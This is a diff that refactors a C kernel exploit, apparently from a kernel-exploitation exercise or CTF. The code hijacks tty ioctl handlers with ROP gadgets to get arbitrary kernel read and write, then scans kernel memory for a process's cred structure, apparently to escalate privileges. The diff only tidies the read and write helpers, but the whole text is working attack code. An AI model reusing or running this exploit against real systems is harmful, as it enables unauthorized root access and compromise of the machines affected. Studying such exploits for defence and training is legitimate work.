@@ -3,7 +3,6 @@
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <string.h>
 #include <sys/ioctl.h>
 #include <sys/prctl.h>
 #include <unistd.h>
@@ -32,30 +31,40 @@ static void leak_offset_and_g_buf(void)
 	printf("[+] g_buf %p\n", g_buf);
 }
 
-static uint32_t aar32(uintptr_t ptr)
+static void set_ioctl(uintptr_t ptr)
 {
-	uint32_t data;
+	uint8_t data[0x420];
+
+	read(fd, data, 0x420);
+	*(uintptr_t *)&data[0x0c * 8] = ptr;
+	*(uintptr_t *)&data[0x418] = g_buf;
+
+	write(fd, data, 0x420);
+}
+
+static uint32_t fast_ioctl(int op, uintptr_t argp)
+{
+	uint32_t ret;
 
 	if (target) {
-		data = ioctl(target, 0, ptr);
+		ret = ioctl(target, op, argp);
 	} else {
 		for (int i = 0; i < 100; ++i) {
-			data = ioctl(tty[i], 0, ptr);
-			if (data != -1) {
+			ret = ioctl(tty[i], op, argp);
+			if (ret != -1) {
 				target = tty[i];
 				break;
 			}
 		}
 	}
 
-	return data;
+	return ret;
 }
 
 static uintptr_t search_cred(void)
 {
 	uint8_t name[16] = "$this_is_evil_$";
 	uintptr_t ptr = g_buf - 0x500000;
-	uint8_t data[0x420];
 	uintptr_t cred;
 	uint32_t tmp;
 
@@ -64,35 +73,31 @@ static uintptr_t search_cred(void)
 		return -1;
 	}
 
-	read(fd, data, 0x420);
-	*(uintptr_t *)&data[0x0c * 8] = OFFSET(mov_eax_prdx);
-	*(uintptr_t *)&data[0x418] = g_buf;
-
-	write(fd, data, 0x420);
+	set_ioctl(OFFSET(mov_eax_prdx));
 
 	while (true) {
 		if (ptr >= g_buf)
 			return -1;
 
-		tmp = aar32(ptr);
+		tmp = fast_ioctl(0, ptr);
 		if (tmp != *(uint32_t *)name) {
 			ptr += 8;
 			continue;
 		}
 
-		tmp = aar32(ptr + 4);
+		tmp = fast_ioctl(0, ptr + 4);
 		if (tmp != *(uint32_t *)&name[4]) {
 			ptr += 8;
 			continue;
 		}
 
-		tmp = aar32(ptr + 8);
+		tmp = fast_ioctl(0, ptr + 8);
 		if (tmp != *(uint32_t *)&name[8]) {
 			ptr += 8;
 			continue;
 		}
 
-		tmp = aar32(ptr + 12);
+		tmp = fast_ioctl(0, ptr + 12);
 		if (tmp != *(uint32_t *)&name[12]) {
 			ptr += 8;
 			continue;
@@ -101,23 +106,18 @@ static uintptr_t search_cred(void)
 		break;
 	}
 
-	cred = (uintptr_t)aar32(ptr - 4) << 32;
-	cred |= aar32(ptr - 8);
+	cred = (uintptr_t)fast_ioctl(0, ptr - 4) << 32;
+	cred |= fast_ioctl(0, ptr - 8);
 
 	return cred;
 }
 
 static void aaw(uintptr_t ptr, uint8_t *buf, size_t len)
 {
-	uint8_t data[0x420];
 	size_t left = len;
 	uint32_t tmp;
 
-	read(fd, data, 0x420);
-	*(uintptr_t *)&data[0x0c * 8] = OFFSET(mov_prdx_ecx);
-	*(uintptr_t *)&data[0x418] = g_buf;
-
-	write(fd, data, 0x420);
+	set_ioctl(OFFSET(mov_prdx_ecx));
 
 	for (int i = 0; i < len; i += 4, left -= 4) {
 		if (left >= 4) {
@@ -129,16 +129,7 @@ static void aaw(uintptr_t ptr, uint8_t *buf, size_t len)
 				       << (3 - i) * 8;
 		}
 
-		if (target) {
-			ioctl(target, tmp, ptr + i);
-		} else {
-			for (int j = 0; j < 100; ++j) {
-				if (ioctl(tty[j], tmp, ptr + i) != -1) {
-					target = tty[j];
-					break;
-				}
-			}
-		}
+		fast_ioctl(tmp, ptr + i);
 	}
 }
 
